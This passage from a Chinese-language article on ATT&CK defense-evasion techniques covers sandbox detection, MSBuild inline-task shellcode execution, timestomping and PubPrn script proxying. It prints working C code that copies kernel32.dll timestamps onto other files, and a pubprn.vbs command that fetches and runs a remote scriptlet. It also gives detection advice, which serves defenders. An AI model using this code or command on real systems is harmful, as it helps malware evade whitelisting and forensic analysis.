                (lstrcmp(pe32.szExeFile, _TEXT("vboxtray.exe")) == 0))
            {
                ret = true;
                break;
            }
        } while (Process32Next(process_snap, &pe32));
    Error_Exit:
        if (process_snap != INVALID_HANDLE_VALUE)
        {
            CloseHandle(process_snap);
            process_snap = INVALID_HANDLE_VALUE;
        }
        return ret;
    }
#### 检查及限制方案
一般而言，虚拟机及沙箱的检测无法通过预防性控制进行环境，因为它基于滥用系统功能
#### 参考链接
ATT&CK：
### 4、受信任的开发人员实用程序利用
#### 原理及代码介绍
有许多实用程序用于软件开发相关的任务，这些实用程序可以用于执行各种形式的代码，以帮助开发人员进行快速开发、调试和逆向工程。这些实用程序通常拥有合法证书进行签名，以使他们可以在系统上执行，通过这些可信任的进程代理执行恶意代码，可以绕过系统中应用程序防御白名单机制。以下将以MSBuild为例，说明该例。
Microsoft Build Engine 是一个用于生成应用程序的平台。 此引擎（也称为 MSBuild）为项目文件提供了一个 XML
架构，用于控制生成平台处理和生成软件的方式。 Visual Studio 会使用 MSBuild，但它不依赖于 Visual Studio。
通过在项目或解决方案文件中调用 msbuild.exe ，可以在未安装 Visual Studio 的环境中安排和生成产品。
Visual Studio 使用 MSBuild 来加载和生成托管项目。 Visual Studio 中的项目文件（.csproj 、.vbproj
、vcxproj 等）包含 MSBuild XML 代码，当你使用 IDE 来生成项目时，此代码就会运行。 Visual Studio
项目会导入所有必要的设置和生成过程来执行典型的开发工作，但你可以从 Visual Studio 内或通过使用 XML 编辑器对其进行扩展或修改。
攻击者可以使用MSBuild通过受信任的Windows实用工具进行代码代理执行，以绕过系统的Applocker 或者 是杀软的白名单检查机制。 .Net
4中引入的MSBuild内联任务功能允许将C#代码插入XML项目文件中，MSBuild将编译并执行内联任务。MSBuild.exe是一个经过Microsoft签名的二进制文件，因此以这种方式使用它时，可以执行执行任意代码，并绕过配置为允许MSBuild执行的应用程序白名单防护。
MSBuild可编译特定格式的XML文件，在.NET Framework 4.0中支持了一项新功能”Inline
Tasks”，被包含在元素UsingTask中，可用来在XML文件中执行C#代码， 如下的XML文件中包含了加载并执行Shellcode的过程：
该XML文件中包含的C#代码，采用了VirtualAlloc()申请内存空间，并将Shellcode拷贝到该地址，最后调用CreateThread()创建线程开始执行，并等待shellcode执行完毕后退出。其中Shellcode由VS编译生成的可执行文件提取而来,运行后弹出提示框。如下图所示：
使用CMD执行”MSBuild execute shellcode.xml” 指定的shellcode 便执行起来
#### 检查及限制方案
使用进程监视工具来监视MSBuild.exe，dnx.exe，rcsi.exe，WinDbg.exe，cdb.exe和tracker.exe的执行和参数,
将这些二进制文件的最近调用与已知良好参数的调用进行比较，已确定异常活动和潜在的对抗活动。这些实用程序很可能会被软件开发人员使用或用于其他与软件开发相关的任务，因此，如果该程序存在并在该用途之外进行使用，则该事件可能是可疑的。对调用实用程序之前和之后使用的命令参数进行分析，
也可能对确定该可执行文件的来源和目的有帮助。
#### 参考链接
Attck：
MSBuild：
Use MSBuild To Do More：
### 5、时间戳伪装
#### 原理及代码介绍
系统中的每一个文件，都有着与时间有关的属性，如文件创建时间、最后一次修改时间及文件最后一次的访问时间等属性。为了使某些文件看起来更像是原本就存在于文件夹中，而不是后来新加入的，恶意软件通常会修改文件的
**时间戳** ，对于某些取证工具或者分析人员而言，经过调整文件时间与大部分已有文件一致，使得文件不会显得那么明显，从而能够逃避部分 **主机取证分析**
。
Att&CK中列举了诸多APT攻击所采用的更改时间戳的防御手段，如伪造PE文件编译时间、修改为desktop.ini文件的时间戳、或是修改恶意文件为Kernel32.dll的文件时间等等，在进行分析的过程中，文件的时间戳也是判断文件来源及合法性的一个有利依据，通过将文件的时间戳改为和系统文件一致，或许可以干扰人工分析的视线，如下的代码演示了利用系统文件Kernel32.dll的时间戳来伪造任意文件的时间戳的过程。
    bool change_time_usekernel32(TCHAR* file_path)
    {
        bool ret = false;
        TCHAR sysdir[MAX_PATH];
        TCHAR kernel32_path[MAX_PATH];
        HANDLE kernel32_handle = INVALID_HANDLE_VALUE;
        HANDLE targetfile_handle = INVALID_HANDLE_VALUE;
        FILETIME create_time;
        FILETIME lastaccess_time;
        FILETIME lastwrite_time;
        //获取kernel32.dll模块的文件时间
        GetSystemDirectory(sysdir, MAX_PATH);
        wsprintf(kernel32_path, _TEXT("%s%s"), sysdir, _TEXT("\\kernel32.dll"));
        kernel32_handle = CreateFile(kernel32_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (kernel32_handle == INVALID_HANDLE_VALUE)
        {
            goto Error_Exit;
        }
        if(!GetFileTime(kernel32_handle, &create_time, &lastaccess_time, &lastwrite_time))
        {
            goto Error_Exit;
        }
        //重置目标文件的文件时间
        targetfile_handle = CreateFile(file_path, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (targetfile_handle == INVALID_HANDLE_VALUE)
        {
            goto Error_Exit;
        }
        if (!SetFileTime(targetfile_handle, &create_time, &lastaccess_time, &lastwrite_time))
        {
            goto Error_Exit;
        }
        ret = true;
    Error_Exit:
        if (targetfile_handle != INVALID_HANDLE_VALUE)
        {
            CloseHandle(targetfile_handle);
        }
        if (kernel32_handle != INVALID_HANDLE_VALUE)
        {
            CloseHandle(kernel32_handle);
        }
        return ret;
    }
    int _tmain(int argc, _TCHAR* argv[])
    {
        change_time_usekernel32(_TEXT("test.txt"));
        return 0;
    }
Kernel32的时间戳如下:
修改前后的文件时间如下：
如果将恶意文件放在系统目录，并伪装成Kernel32的时间戳，对于部分人工分析取证手段会具有一定迷惑性。
#### 检查及限制方案
  1. 可以使用文件修改监视工具来监视文件的时间戳更改情况，并记录日志以便后续进行分析和筛查。
  2. 这种攻击技术无法通过预防性控制来缓解，因为它基于滥用系统功能。
#### 参考链接
Att&ck：
### 6、PubPrn代理脚本代码执行
#### 原理及代码介绍
随着恶意的脚本文件不断增加，在某些系统环境中，管理人员可能使用白名单来阻止未签名的Windows Script
Host（WSH）脚本文件运行，但是通过将恶意代码“注入”到Microsoft签名的脚本中，使用 **受信任证书**
签名的脚本代理执行恶意脚本文件，从而可以绕过系统中的 **签名验证** 和部分杀软的 **应用程序白名单** 验证绕过。
Windows系统中存在的PubPrn.vbs由Microsoft签名，恶意利用该脚本可以代理远程脚本文件的执行，以突破部分安全限制。利用的命令如下：
    pubprn.vbs 127.0.0.1 script:http://127.0.0.1/sc.sct
Pubprn脚本的位置在system32的子目录中，本身是用于打印相关的工作。
在其脚本中，68行的位置使用了来自参数中的内容，将该内容传递给GetObject()函数,
鉴于此使用者可以在此处指定网络文件以执行自定义的脚本文件。Pubprn的利用只是一个样例，安全人员以此为基础可以了解此类内置脚本的利用方法，以便在安全分析过程识破攻击者的意图。
以下为打开计算器的脚本文件
执行该命令，脚本得以执行弹出计算器
#### 检查及限制方案